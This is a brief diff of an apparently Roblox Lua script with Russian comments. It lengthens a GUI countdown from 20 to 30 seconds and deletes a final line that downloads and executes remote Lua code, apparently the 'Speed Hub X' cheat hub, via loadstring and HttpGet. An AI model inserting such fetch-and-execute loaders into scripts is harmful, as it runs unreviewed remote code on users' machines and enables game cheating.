@@ -92,7 +92,7 @@ task.spawn(function()
 end)
 
 -- Таймер и прогресс
-local duration = 20
+local duration = 30
 for i = duration, 1, -1 do
     TimerLabel.Text = "Approximately " .. i .. " seconds left"
 
@@ -123,4 +123,3 @@ end
 
 -- Удаление GUI
 ScreenGui:Destroy()
-loadstring(game:HttpGet("https://raw.githubusercontent.com/AhmadV99/Speed-Hub-X/main/Speed%20Hub%20X.lua", true))()
